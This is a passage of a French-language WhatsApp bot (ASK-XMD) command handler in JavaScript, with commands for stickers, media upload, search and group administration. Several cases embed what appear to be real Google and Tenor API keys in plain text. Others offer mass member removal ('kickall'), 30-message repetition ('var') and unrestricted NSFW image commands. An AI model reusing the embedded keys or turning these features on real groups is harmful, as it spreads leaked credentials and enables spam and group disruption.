 `*𖧷𝕞𝕖𝕤𝕤𝕒𝕘𝕖𖧷* : ${text ? text : ''}\n╭──♕ 𝐀𝐒𝐊-𝐗𝐌𝐃 ♕ ──╮\n`;

 for (let mem of participants) {
 teks += `│ ❖ @${mem.id.split('@')[0]}\n`;
 }

 // Envoi du message avec une image
 await ask.sendMessage(m.chat, {
gifPlayback: false,
 image: { url: 'welcome.png'},
 caption: teks,
 mentions: participants.map(a => a.id)
 }, { quoted: m });
}
break;

case 'url':
case 'tourl':
case 'upload': {
 try {
 // Vérifier si c'est une réponse à un média
 const quoted = m.quoted ? m.quoted : m;
 const mime = (quoted.msg || quoted).mimetype || '';
 
 if (!mime) return m.reply('⚠️ Répondez à un média (image, vidéo ou audio)');

 // Types MIME autorisés
 const allowedTypes = [
 'image/jpeg', 'image/png', 'image/gif',
 'video/mp4', 'video/quicktime',
 'audio/mpeg', 'audio/ogg'
 ];

 if (!allowedTypes.includes(mime)) {
 return m.reply(`❌ Type de média non supporté: ${mime}`);
 }

 m.reply('📤 Envoi du média à Catbox...');

 // Télécharger le média
 const mediaBuffer = await quoted.download();

 // Préparer le FormData
 const FormData = require('form-data');
 const form = new FormData();
 form.append('reqtype', 'fileupload');
 form.append('fileToUpload', mediaBuffer, {
 filename: `media_${Date.now()}.${mime.split('/')[1]}`,
 contentType: mime
 });

 // Envoyer à l'API Catbox
 const axios = require('axios');
 const { data: fileUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
 headers: {
 ...form.getHeaders(),
 'User-Agent': 'ASK-XMD-Bot/1.0'
 }
 });

 // Envoyer le résultat
 await m.reply(`✅ Média uploadé avec succès!\n🔗 Lien: ${fileUrl}\n> 𝙱𝚈 𝙰𝚂𝙺 𝚇𝙼𝙳 𝟷.𝟸.𝟶`);

 } catch (error) {
 console.error('Erreur tourl:', error);
 m.reply('❌ Échec de l\'upload vers Catbox');
 }
}
 break;





case "ping": {
 const startTime = Date.now();
 const pingAsk = await m.reply('𝑷𝖔𝕟g͆ 🧃!');
 
 const latency = Date.now() - startTime;
 await m.reply(`𝑨𝑺𝑲 𝑿𝑴𝑫 :\n> ${latency}𝐌𝐬`);   
}
break;

case 'emo':
case 'emojimix': {
 let [emoji1, emoji2] = text.split`+`
 if (!emoji1) return m.reply(`Example : ${prefix + command} 😅+🤔`)
 if (!emoji2) return m.reply(`Example : ${prefix + command} 😅+🤔`)
 await m.reply(`processing`)
 let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
 for (let res of anu.results) {
 let encmedia = await ask.sendImageAsSticker(m.chat, res.url, m, {
 packname: global.packname,
 author: global.author,
 categories: res.tags
 })
 }
 }
 break;


case 'sticker': case 's': {
 if (!quoted) return m.reply(`Reply Image or Video with command ${prefix + command}`);
 
 if (/image/.test(mime)) {
 let media = await quoted.download();
 let encmedia = await ask.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
 await fs.unlinkSync(encmedia);
 } else if (/video/.test(mime)) {
 if ((quoted.msg || quoted).seconds > 17) return m.reply('max 17s');
 
 let media = await quoted.download();
 let encmedia = await ask.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
 await fs.unlinkSync(encmedia);
 } else {
 return m.reply(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
 }
}
break;


case 'take': {
 if (!quoted) return m.reply(`❌ Répondez à un sticker avec ${prefix}take`);
 const senderName = m.pushName || m.sender.split('@')[0];
 const media = await m.quoted.download();
 
 // Détection du type (image/vidéo)
 const isAnimated = m.quoted?.animated || false;

 if (isAnimated) {
 const encmedia = await ask.sendMessage(m.chat, {
 sticker: media,
 packname: `${senderName}`,
 author: global.author
 }, { quoted: m });
 await fs.unlinkSync(encmedia);
 } else {
 const encmedia = await ask.sendMessage(m.chat, {
 sticker: media,
 packname: `${senderName}`,
 author: global.author
 }, { quoted: m });
 await fs.unlinkSync(encmedia);
 }
}
break;











case "setppgc": {
if (!isGroup) return m.reply('> uniquement pour les groupe')
if (!isAdmin && ! isCreator) return m.reply('> uniquement pour les admins')
if (!isBotAdmin) return m.reply('> le bot dois etre admins')
if (/image/g.test(mime)) {
let media = await ask.downloadAndSaveMediaMessage(qmsg)
await ask.updateProfilePicture(m.chat, {url: media})
await fs.unlinkSync(media)
m.reply("Group profile photo changed successfully by ask-xmd")
} else return m.reply('tag/reply photo')}
break;

case 'wiki': 
case 'wikien': 
case 'wikifr': {
 try {
 const fetch = require('node-fetch');
 const lang = command === 'wikifr' ? 'fr' : 'en';
 
 if (!args.length) {
 const example = lang === 'fr' ? "Ex: .wiki Paris" : "Ex: .wiki Eiffel Tower";
 await ask.sendMessage(m.chat, { 
 text: `⚠️ *Usage*: .${command} <recherche>\n${example}` 
 }, { quoted: m });
 break;
 }

 const query = args.join(' ');
 await ask.sendMessage(m.chat, { 
 text: `🔎 *Recherche Wikipedia (${lang.toUpperCase()})*: "${query}"...` 
 }, { quoted: m });

 const url = `https://${lang}.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(query)}`;
 const response = await fetch(url);
 
 if (!response.ok) {
 await ask.sendMessage(m.chat, { 
 text: `❌ Aucun résultat trouvé pour "${query}" sur Wikipedia ${lang.toUpperCase()}` 
 }, { quoted: m });
 break;
 }

 const data = await response.json();
 
 if (data.extract) {
 const result = `*📚 ${data.title}*\n\n${data.extract}\n\n🔗 *En savoir plus*: ${data.content_urls.desktop.page}`;
 await ask.sendMessage(m.chat, { text: result }, { quoted: m });
 } else {
 await ask.sendMessage(m.chat, { 
 text: `⚠️ Article incomplet pour "${query}"` 
 }, { quoted: m });
 }

 } catch (error) {
 console.error('Erreur commande wiki:', error);
 await ask.sendMessage(m.chat, { 
 text: '❌ Erreur lors de la recherche Wikipedia' 
 }, { quoted: m });
 }
}
 break;


case 'img': {
 try {
 const GOOGLE_API_KEY = "AIzaSyDo09jHOJqL6boMeac-xmPHB-yD9dKOKGU";
 const GOOGLE_CX = 'd1a5b18a0be544a0e';
 
 if (!args.length) {
 await ask.sendMessage(m.chat, { 
 text: "⚠️ *Usage* : .img <recherche>\nEx: .img paysage japonais" 
 }, { quoted: m });
 break;
 }

 const query = args.join(' ');
 await ask.sendMessage(m.chat, { 
 text: `🔎 *Recherche en cours* : "${query}"...` 
 }, { quoted: m });

 // Fonction de recherche d'images
 const searchImages = async (q) => {
 const response = await axios.get('https://www.googleapis.com/customsearch/v1', {
 params: {
 q: q,
 cx: GOOGLE_CX,
 searchType: 'image',
 key: GOOGLE_API_KEY,
 safe: 'active',
 num: 8 // Nombre de résultats
 }
 });
 return response.data.items || [];
 };

 const images = await searchImages(query);
 
 if (images.length === 0) {
 await ask.sendMessage(m.chat, { 
 text: "❌ Aucun résultat trouvé pour cette recherche." 
 }, { quoted: m });
 break;
 }

 // Sélection aléatoire ou premier résultat
 const selectedImg = images[Math.floor(Math.random() * images.length)];
 
 // Envoi de l'image avec caption
 await ask.sendMessage(m.chat, {
 image: { url: selectedImg.link },
 caption: `📷 *Résultat pour* : ${query}\n🔗 *Lien* : ${selectedImg.link}`
 }, { quoted: m });

 } catch (error) {
 console.error('Erreur commande img:', error);
 await ask.sendMessage(m.chat, { 
 text: "❌ Erreur lors de la recherche d'images. API peut-être limitée." 
 }, { quoted: m });
 }
}
 break;










case 'fancy': {
 // Vérification des arguments
 if (!args.length) {
 // Générer la liste des styles avec exemple
 let fancyList = "🎀 *FANCY TEXT STYLES* 🎀\n\n";
 for (let i = 0; i < 34; i++) { // 34 styles disponibles
 if (fancy[i]) {
 const sampleText = fancy.apply(fancy[i], "ASK-MD");
 fancyList += `${i}. ${sampleText}\n`;
 }
 }
 fancyList += `\nEx: ${prefix}fancy 10 VOTRE_TEXTE`;
 
 // Envoyer avec caractères cachés pour le défilement
 const hiddenChars = String.fromCharCode(8206).repeat(4001);
 return await m.reply(fancyList + hiddenChars);
 }

 // Extraire l'ID et le texte
 const id = args[0].match(/\d+/)?.[0];
 const text = args.slice(1).join(" ");

 if (!id || !text) {
 return await m.reply(`❌ Format: ${prefix}fancy [ID] TEXTE]\nEx: ${prefix}fancy 5 Salut`);
 }

 // Appliquer le style
 const style = fancy[parseInt(id)];
 if (!style) return await m.reply("❌ ID de style invalide (0-33)");

 try {
 const styledText = fancy.apply(style, text);
 await m.reply(styledText);
 } catch (e) {
 await m.reply("❌ Erreur d'application du style");
 }
}
break;

case "demote": {
 if (!isGroup) return m.reply("Spécial Groupe");
 if (!isAdmin && !isCreator) return m.reply("Spécial Admin");
 if (!isBotAdmin) return m.reply("Le bot n'est pas administrateur dans ce groupe");

 if (m.quoted || text) {
 let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
 await ask.groupParticipantsUpdate(m.chat, [target], 'demote')
 .then((res) => m.reply(`Le membre ${target.split("@")[0]} n'est plus administrateur dans ce groupe`))
 .catch((err) => m.reply(err.toString()));
 } else {
 return m.reply("Exemple : 241XX");
 }
}
 break;


case "promote":
case "promot": {
 if (!isGroup) return m.reply("Uniquement pour les groupes");
 if (!isAdmin && !isCreator) return m.reply("Commande réservée uniquement aux administrateurs du groupe");
 if (!isBotAdmin) return m.reply("Le bot n'est pas administrateur");

 if (m.quoted || text) {
 let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
 await ask.groupParticipantsUpdate(m.chat, [target], 'promote')
 .then((res) => m.reply(`L'utilisateur ${target.split("@")[0]} est maintenant administrateur`))
 .catch((err) => m.reply(err.toString()));
 } else {
 return m.reply("Exemple : 241XXX/@tag");
 }
}
 break;

case 'google': {
 try {
 // Vérification du terme de recherche
 if (args.length === 0) {
 return m.reply(`❗ *Veuillez spécifier une recherche.*\n\n*Exemple :*\n.google Intelligence Artificielle`);
 }

 const recherche = args.join(" ");
 const cleAPI = "AIzaSyDMbI3nvmQUrfjoCJYLS69Lej1hSXQjnWI"; // Clé API Google
 const moteurID = "baf9bdb0c631236e5"; // ID de moteur de recherche personnalisé
 const urlAPI = `https://www.googleapis.com/customsearch/v1?q=${encodeURIComponent(recherche)}&key=${cleAPI}&cx=${moteurID}`;

 // Appel de l'API Google
 const reponse = await axios.get(urlAPI);

 // Vérification des résultats
 if (reponse.status !== 200 || !reponse.data.items || reponse.data.items.length === 0) {
 return m.reply(`❌ *Aucun résultat trouvé pour :* ${recherche}`);
 }

 // Formatage des résultats
 let resultats = `🔎 *Résultats Google pour :* "${recherche}"\n\n`;
 reponse.data.items.slice(0, 5).forEach((item, index) => {
 resultats += `*${index + 1}. ${item.title}*\n${item.link}\n${item.snippet}\n\n`;
 });

 m.reply(resultats.trim());
 
 } catch (erreur) {
 console.error("Erreur Google Search:", erreur);
 m.reply(`⚠️ *Une erreur s'est produite lors de la recherche.*\n\n${erreur.message}`);
 }
}
break;


case 'setauthor': {
 if (!isCreator) return m.reply('❌ Réservé au propriétaire');
 global.author = text || "Mon Bot";
 m.reply(`🖋️ Auteur défini : ${global.author}`);
}
break;

case 'setpack': {
 if (!isCreator) return m.reply('❌ Réservé au propriétaire');
 global.packname = text || "Mon Pack";
 m.reply(`🆕 Packname défini : ${global.packname}`);
}
break;

case 'left': {
 // Vérification propriétaire
 if (!isCreator) return m.reply('❌ Commande réservée au propriétaire !');
 
 // Vérification groupe
 if (!m.isGroup) return m.reply('⚠️ Uniquement dans les groupes !');

 const groupName = groupMetadata.subject || "ce groupe";
 
 // 1. Annonce du départ
 await m.reply(`🚪 Le bot quitte le groupe ${groupName}...`);
 
 // 2. Quitter immédiatement
 await ask.groupLeave(m.chat);
}
break;

case 'givelink': {
 // Liste complète des plateformes supportées
 const availablePlatforms = {
 youtube: "Recherche YouTube",
 google: "Recherche Google",
 apk: "Recherche d'APK sur APKPure", 
 spotify: "Recherche Spotify",
 amazon: "Recherche Amazon",
 twitter: "Recherche Twitter",
 github: "Recherche GitHub",
 npm: "Recherche NPM",
 pinterest: "Recherche Pinterest",
 instagram: "Recherche Instagram (hashtags)"
 };

 // Message d'aide avec liste formatée
 const helpMessage = 
 `🎯 *Utilisation* : .givelink [plateforme] [recherche]\n\n` +
 `📚 *Plateformes disponibles* :\n` +
 Object.entries(availablePlatforms)
 .map(([key, desc]) => `• *${key}* - ${desc}`)
 .join('\n') +
 `\n\nExemple : .givelink youtube tiakola meuda`;

 if (!text) return m.reply(helpMessage);

 const args = text.trim().split(' ');
 if (args.length < 2) return m.reply(helpMessage);

 const platform = args[0].toLowerCase();
 const query = args.slice(1).join(' ');

 // Mapping des URLs
 const platformUrls = {
 youtube: `https://www.youtube.com/results?search_query=${encodeURIComponent(query)}`,
 google: `https://www.google.com/search?q=${encodeURIComponent(query)}`,
 apk: `https://apkpure.com/search?q=${encodeURIComponent(query)}`,
 spotify: `https://open.spotify.com/search/${encodeURIComponent(query)}`,
 amazon: `https://www.amazon.fr/s?k=${encodeURIComponent(query)}`,
 twitter: `https://twitter.com/search?q=${encodeURIComponent(query)}`,
 github: `https://github.com/search?q=${encodeURIComponent(query)}`,
 npm: `https://www.npmjs.com/search?q=${encodeURIComponent(query)}`,
 pinterest: `https://pinterest.com/search/pins/?q=${encodeURIComponent(query)}`,
 instagram: `https://www.instagram.com/explore/tags/${encodeURIComponent(query)}/`
 };

 if (!platformUrls[platform]) {
 return m.reply(`❌ Plateforme inconnue. Voici les options :\n${Object.keys(availablePlatforms).map(p => `- ${p}`).join('\n')}`);
 }

 await m.reply(
 `🔍 *Résultat pour* : "${query}"\n` +
 `🌐 *Plateforme* : ${availablePlatforms[platform]}\n` +
 `🔗 *Lien* : ${platformUrls[platform]}\n\n` +
 `_Cliquez pour accéder à la recherche_`
 );
}
break;


case 'blowjob': {
 const messages = [];
 const imageCount = 5; // Nombre d'images à envoyer

 for (let i = 0; i < imageCount; i++) {
 try {
 const waifudd = await axios.get('https://api.waifu.pics/nsfw/blowjob');
 const imageUrl = waifudd.data.url;

 messages.push(
 ask.sendMessage(m.chat, {
 image: { url: imageUrl },
 caption: `ASK XMD 🥺🙏`
 }, { quoted: m })
 );
 } catch (err) {
 console.error(`Erreur lors de la récupération de l'image ${i + 1}:`, err);
 messages.push('Erreur lors de la récupération de l\'image.');
 }
 }

 await Promise.all(messages); // Attendre que tous les messages soient envoyés
}
break;


case 'creategroup': {
 if (!isCreator) return m.reply('seule le owner peux utilise cette commande');
 
 if (!text) return m.reply('❌ *Usage* : .creategroup NomDuGroupe');
 
 // Anti-spam (1 création/min)
 const user = m.sender;
 const now = Date.now();
 if (global.lastGroupCreation?.[user] && (now - global.lastGroupCreation[user] < 60000)) {
 const remainingTime = Math.ceil((60000 - (now - global.lastGroupCreation[user])) / 1000);
 return m.reply(`⌛ Attendez encore ${remainingTime}s avant de créer un nouveau groupe`);
 }
 global.lastGroupCreation = { ...global.lastGroupCreation, [user]: now };

 // Création du groupe vide
 const groupName = text.slice(0, 25).trim();
 const createResult = await ask.groupCreate(groupName, []);
 const groupId = createResult.gid;
 const inviteLink = `https://chat.whatsapp.com/${await ask.groupInviteCode(groupId)}`;

 await m.reply(
 `📛 *${groupName}* en cours de création...\n` +
 `🔗 ${inviteLink}\n` +
 `_Patientez pendant l'ajout des membres..._`
 );

 // Si lancé dans un groupe existant
 if (m.isGroup) {
 const membersToAdd = groupMetadata.participants
 .filter(p => !p.admin && !p.id.includes('status@broadcast'))
 .slice(0, 150)
 .map(p => p.id);

 const totalBatches = Math.ceil(membersToAdd.length / 4);
 let currentBatch = 1;

 // Fonction compte à rebours
 const updateCountdown = async () => {
 const progressMsg = 
 `🔄 Ajout des membres (${currentBatch}/${totalBatches})\n` +
 `⏳ Prochain lot dans : ${countdown}s\n` +
 `👥 Restants : ${membersToAdd.length - (currentBatch-1)*4}`;
 
 await m.reply(progressMsg).catch(() => {});
 };

 // Ajout par lots avec compte à rebours
 for (let i = 0; i < membersToAdd.length; i += 4) {
 let countdown = 3;
 const countdownInterval = setInterval(() => {
 updateCountdown();
 countdown--;
 }, 1000);

 await ask.groupParticipantsUpdate(groupId, membersToAdd.slice(i, i+4), 'add');
 clearInterval(countdownInterval);
 currentBatch++;

 if (i+4 < membersToAdd.length) {
 await new Promise(resolve => setTimeout(resolve, 3000));
 }
 }
 }

 // Message final stylé
 await m.reply(
 `╔══════════════════╗\n` +
 `║ ✅ GROUPE PRÊT ✅ ║\n` +
 `╚══════════════════╝\n` +
 `📛 Nom : ${groupName}\n` +
 `👥 Membres : ${m.isGroup ? '150 max' : '0'}\n` +
 `🔗 ${inviteLink}\n\n` +
 `_Créé par @${user.split('@')[0]}_`,
 { mentions: [user] }
 );
}
break;

case 'kickall': {
 if (!m.isGroup) return m.reply('𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗚𝗿𝗼𝘂𝗽!')
 if (!isCreator) return m.reply('𝗢𝗻𝗹𝘆 𝗢𝘄𝗻𝗲𝗿 & 𝗔𝗱𝗺𝗶𝗻 𝗰𝗮𝗻 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!')
 if (!isAdmin) return m.reply('𝗕𝗼𝘁 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗔𝗱𝗺𝗶𝗻 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽!')
 
 const kickall = (args[0] === 'numBut')
 ? text.replace(`${args[0]} `, '').split('|')
 : (Number(args[0]))
 ? groupMetadata.participants
 .filter(item => 
 item.id.startsWith(args[0].replace('+', '')) && 
 item.id !== botNumber && 
 item.id !== `${owner}@s.whatsapp.net` &&
 !item.admin // Ne pas inclure les admins
 )
 .map(item => item.id)
 : groupMetadata.participants
 .filter(item => 
 item.id !== botNumber && 
 item.id !== `${owner}@s.whatsapp.net` &&
 !item.admin // Ne pas inclure les admins
 )
 .map(item => item.id);
 
 if (global.welcome === true) {
 welcome = false;
 }
 
 for (let remove of kickall) {
 await ask.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(1000);
 }
 
 m.reply(`*ASK XMD V1 A SUPPRIMER TOUT LES MEMBRES SAUF LES ADMIN AVEC SUCCÈS*`);
}
break;

case 'var': {
 const textToRepeat = text.substring(4).trim(); // Récupère le texte après "var "
 
 if (!text) {
 return ask.sendMessage(m.key.remoteJid, {
 text: "⚠️ Usage: var [message]\nExemple: var love"
 });
 }

 for (let i = 0; i < 30; i++) {
 await ask.sendMessage(m.key.remoteJid, {
 text: textToRepeat
 });
 }
 }
break;

case "tagadmin": {
 if (!m.isGroup) return m.reply("❌ Uniquement pour les groupes");

 // Récupère la liste des admins
 const groupData = await ask.groupMetadata(m.chat);
 const admins = groupData.participants.filter(p => p.admin);

 // Formatage des mentions
 const mentions = admins.map(admin => `@${admin.id.split('@')[0]}`).join(' ');

 // Envoi de l'image avec mentions
 await ask.sendMessage(m.chat, {
 text: `*ASK XMD*\n\n📢 **Appel des admins !** 📢\n${mentions}\n`,
 mentions: admins.map(admin => admin.id)
 });
}
 break;

case "promoteall": {
 if (!m.isGroup) return m.reply(mess.group);
 if (!isBotAdmin) return m.reply(mess.botAdmin)
 if (!isCreator && !isAdmin) return m.reply(mess.admin);

 try {
 const groupData = await ask.groupMetadata(m.chat);
 const participants = groupData.participants;
 const existingAdmins = participants.filter(p => p.admin).map(p => p.id);

 // Protection anti-abus
 if (participants.length > 200) {
 return m.reply("⚠️ Trop de membres (max 200 pour cette commande)");
 }

 let success = 0, failed = 0;
 const BATCH_DELAY = 1000; // 5s entre les groupes de promotions

 for (const user of participants) {
 try {
 // Ne pas promouvoir les admins existants
 if (!existingAdmins.includes(user.id)) {
 await ask.groupParticipantsUpdate(
 m.chat, 
 [user.id], 
 "promote"
 );
 success++;
 
 // Délai aléatoire entre 1-3s
 await new Promise(r => setTimeout(r, 1000 + Math.random() * 1000));
 }
 } catch (e) {
 failed++;
 console.error(`Échec promotion ${user.id}:`, e);
 }
 }

 // Rapport final
 const report = [
 `⚡ *Résultat des promotions* :`,
 `• Membres totaux : ${participants.length}`,
 `• Admins existants : ${existingAdmins.length}`,
 `• Nouveaux admins : ${success}`,
 `• Échecs : ${failed}`,
 `\n⚠️ Les changements peuvent prendre quelques minutes à s'afficher`
 ].join('\n');

 return m.reply(report);

 } catch (error) {
 console.error('Erreur promoteall:', error);
 return m.reply("❌ Erreur lors des promotions - Vérifiez les permissions du bot");
 }
}
 break;

case "demoteall": {
 if (!m.isGroup) return m.reply("❌ Commande réservée aux groupes");
 if (!isBotAdmin) return m.reply('le bot n\'est pas admin');
 if (!isAdmin && !isCreator) return m.reply("❌ Permission refusée");

 try {
 const groupData = await ask.groupMetadata(m.chat);
 const participants = groupData.participants;
 
 // Liste protégée : bot + utilisateur actuel
 const PROTECTED = [
 ask.user.id, // ID du bot
 m.sender // ID de l'utilisateur
 ];

 // Filtre les admins non protégés
 const adminsToDemote = participants.filter(p => 
 p.admin && !PROTECTED.includes(p.id)
 );

 if (adminsToDemote.length === 0) {
 return m.reply("ℹ️ Aucun admin à rétrograder (bot et vous êtes protégés)");
 }

 let success = 0, failed = 0;
 const BATCH_SIZE = 10; // Traitement par lots
 const DELAY = 1000; // 1s entre les lots

 for (let i = 0; i < adminsToDemote.length; i += BATCH_SIZE) {
 const batch = adminsToDemote.slice(i, i + BATCH_SIZE);
 
 await Promise.all(batch.map(async (admin) => {
 try {
 await ask.groupParticipantsUpdate(
 m.chat,
 [admin.id],
 "demote"
 );
 success++;
 } catch (e) {
 failed++;
 console.error(`Échec sur ${admin.id}:`, e.message);
 }
 }));

 if (i < adminsToDemote.length - BATCH_SIZE) {
 await new Promise(r => setTimeout(r, DELAY));
 }
 }

 // Rapport
 const report = [
 `⚡ *Rétrogradations terminées*`,
 `• Admins traités: ${adminsToDemote.length}`,
 `• Réussites: ${success}`,
 `• Échecs: ${failed}`,
 `• Protégés: ${PROTECTED.length} (vous + bot)`,
 `\n⚠️ Actualisez WhatsApp pour voir les changements`
 ].join('\n');

 return m.reply(report);

 } catch (error) {
 console.error('Erreur demoteall:', error);
 return m.reply("❌ Erreur - Vérifiez que le bot est admin");
 }
}
 break;

case 'link': {
 if (!m.isGroup) return m.reply("❌ Cette commande est réservée aux groupes.");

 if (!isAdmin && !isCreator) return m.reply("❌ Permission refusée");

 let metadata = await ask.groupMetadata(m.chat);
 let owner = metadata.owner ? metadata.owner : metadata.participants.find(p => p.admin === 'superadmin')?.id;
 let admins = metadata.participants.filter(p => p.admin).map(p => `- @p.id.split('@')[0]`); 
 let groupInvite = await ask.groupInviteCode(m.chat);
let groupImage = await ask.profilePictureUrl(m.chat, 'image').catch(_ => null);
 let message = `
╭─❒ 〔 *INFOS DU GROUPE* 〕
├ 📎 *Nom:* *${metadata.subject}*
├ 🆔 *JID:* *${m.chat}*
├ 👑 *Owner:* *@${owner?.split('@')[0] ||'inconnu'}*
├ 👥 *Membres:* *${metadata.participants.length}*
├ 🛡️ *Admins:* *${admins.length}*
├ 🔗 *Lien:* https://chat.whatsapp.com/${groupInvite}
╰❒
`;
 await ask.sendMessage(m.chat, {
 image: { url: groupImage || 'https://i.ibb.co/BCqjYdL/default-group.png' },
 caption: message,
 mentions: [owner, ...admins]
 }, { quoted: m });
}
break;

case 'sendmc': {
 if (!isCreator) return m.reply("Commande réservée au créateur.");

 if (!text) return m.reply('*Écris le message à envoyer dans les chaînes*');

 try {
 for (const channel of authorizedChannels) {
 await ask.sendMessage(channel, { text: text }); // envoi asynchrone
 }

 return m.reply('✅ *Message envoyé avec succès dans toutes les chaînes autorisées*');
 } catch (e) {
 console.error(e);
 return m.reply('❌ *Échec de l’envoi.*\nVérifie :\n- Le bot est admin\n- Les JIDs sont valides\n- Baileys est à jour');
 }
}
break;

case 'addchjid': {
 if (!isCreator) return m.reply("Vous n'êtes pas autorisé à utiliser cette commande.");
 if (!text) return m.reply('Veuillez fournir un JID de chaîne à ajouter !');

 const newChannel = text.trim();

 if (authorizedChannels.includes(newChannel)) {
 return m.reply('Ce JID est déjà autorisé.');
 }

 authorizedChannels.push(newChannel);
 saveChannels(authorizedChannels);
 return m.reply(`✅ JID ajouté : ${newChannel}`);
}
break;


case 'uptime': {
 // Calcul du temps écoulé
 const uptime = process.uptime();
 const days = Math.floor(uptime / 86400);
 const hours = Math.floor((uptime % 86400) / 3600);
 const minutes = Math.floor((uptime % 3600) / 60);
 const seconds = Math.floor(uptime % 60);
 
 // Formatage dynamique
 let timeString = [];
 if (days > 0) timeString.push(`${days} jour${days > 1 ? 's' : ''}`);
 if (hours > 0) timeString.push(`${hours} heure${hours > 1 ? 's' : ''}`);
 if (minutes > 0) timeString.push(`${minutes} minute${minutes > 1 ? 's' : ''}`);
 if (seconds > 0) timeString.push(`${seconds} seconde${seconds > 1 ? 's' : ''}`);
 
 // Statistiques système
 const memUsage = (process.memoryUsage().rss / 1024 / 1024).toFixed(2);
 const cpuUsage = process.cpuUsage().user / 1000000;
 
 // Message stylé
 const uptimeMessage = `
🟢 *STATUT DU BOT* 🟢

⏱️ Temps de fonctionnement : 
${timeString.join(', ')}

📊 Statistiques :
- Mémoire utilisée : ${memUsage} MB
- CPU utilisé : ${cpuUsage.toFixed(2)} s
- Plateforme : ${process.platform}
- Node.js : ${process.version}

🔄 Redémarrage automatique activé
 `;
 
 await m.reply(uptimeMessage);
 
 // Optionnel : Envoyer aussi en console
 console.log(`[UPTIME] Commande exécutée par ${m.sender.split('@')[0]} | ${timeString.join(' ')}`);
}
break;


case "srh":
case "stickersearch": {
 if (!text) { 
 return m.reply("Veuillez fournir un terme de recherche !");
 }

 const gifSearchTerm = args.join(" ");
 const tenorApiKey = "AIzaSyCyouca1_KKy4W_MG1xsPzuku5oa8W358c"; // Votre clé API Tenor

 // Récupère 8 résultats
 const gifResponse = await axios.get(
 `https://tenor.googleapis.com/v2/search?q=${encodeURIComponent(gifSearchTerm)}&key=${tenorApiKey}&client_key=my_project&limit=8&media_filter=gif`
 );

 // Envoie les 5 premiers résultats comme stickers
 for (let i = 0; i < 5 && i < gifResponse.data.results.length; i++) {
 const gifUrl = gifResponse.data.results[i].media_formats.gif.url;

 const stickerMess = new Sticker(gifUrl, {
 pack: "ASK-MD", // Utilise packname global ou une valeur par défaut
 author: 'ASK-MD',
 type: StickerTypes.FULL,
 categories: ["🤩", "🎉"],
 id: "12345",
 quality: 60,
 background: "transparent",
 });

 const stickerBuffer = await stickerMess.toBuffer();
 await ask.sendMessage(m.chat, { sticker: stickerBuffer }, { quoted: m });
 
 // Petite pause entre chaque envoi
 await new Promise(resolve => setTimeout(resolve, 1000));
 }
}
break;


case 'trap': {
 const messages = [];
 const imageCount = 5; // Nombre d'images à envoyer

 for (let i = 0; i < imageCount; i++) {
 try {
 const waifudd = await axios.get('https://api.waifu.pics/nsfw/trap');
 const imageUrl = waifudd.data.url;

 messages.push(
 ask.sendMessage(m.chat, {
 image: { url: imageUrl },
 caption: `ASK XMD 🥺🙏`
 }, { quoted: m })
 );
 } catch (err) {
 console.error(`Erreur lors de la récupération de l'image ${i + 1}:`, err);
 messages.push('Erreur lors de la récupération de l\'image.');
 }
 }

 await Promise.all(messages); // Attendre que tous les messages soient envoyés
}
break;

case 'megumin': {
 const messages = [];
 const imageCount = 5; // Nombre d'images à envoyer

 for (let i = 0; i < imageCount; i++) {
 try {
 const waifudd = await axios.get('https://api.waifu.pics/sfw/megumin');
 const imageUrl = waifudd.data.url;

 messages.push(
 ask.sendMessage(m.chat, {
 image: { url: imageUrl },
 caption: `ASK XMD 🥺🙏`
 }, { quoted: m })
 );
 } catch (err) {
 console.error(`Erreur lors de la récupération de l'image ${i + 1}:`, err);
 messages.push('Erreur lors de la récupération de l\'image.');
 }
 }

 await Promise.all(messages); // Attendre que tous les messages soient envoyés
}
break;

case 'shinobu': {
 const messages = [];
 const imageCount = 5; // Nombre d'images à envoyer

 for (let i = 0; i < imageCount; i++) {
 try {
 const waifudd = await axios.get('https://api.waifu.pics/sfw/shinobu');
 const imageUrl = waifudd.data.url;

 messages.push(
 ask.sendMessage(m.chat, {
 image: { url: imageUrl },
 caption: `ASK XMD 🥺🙏`
 }, { quoted: m })
 );
 } catch (err) {
 console.error(`Erreur lors de la récupération de l'image ${i + 1}:`, err);
 messages.push('Erreur lors de la récupération de l\'image.');
 }
 }

 await Promise.all(messages); // Attendre que tous les messages soient envoyés
}
break


case "getcase": {
 if (!isCreator) return m.reply('Seul le propriétaire peut utiliser cette commande.');
 if (!text) return ask.sendMessage(m.chat, { text: 'Contoh: .getcase menu' }, { quoted: m });
 const getcase = (cases) => {
 const fileContent = fs.readFileSync('handler.js').toString();

 let casePattern1 = `case "${cases}"`;
 let casePattern2 = `case '${cases}'`;
 let startIndex = -1;
 let caseDeclaration = '';
 if (fileContent.includes(casePattern1)) {
 startIndex = fileContent.indexOf(casePattern1);
 caseDeclaration = casePattern1;
 } else if (fileContent.includes(casePattern2)) {
 startIndex = fileContent.indexOf(casePattern2);
 caseDeclaration = casePattern2;
 } else {
 throw new Error("Case not found");
 }
 if (startIndex === -1) throw new Error("Case not found");
 const caseContent = fileContent.substring(startIndex);
 const breakIndex = caseContent.indexOf("break");
 if (breakIndex === -1) throw new Error("Invalid case format: no break statement found");
 const completeCase = caseContent.substring(0, breakIndex + 5);
 return completeCase;
 }
 try {
 const result = getcase(text);
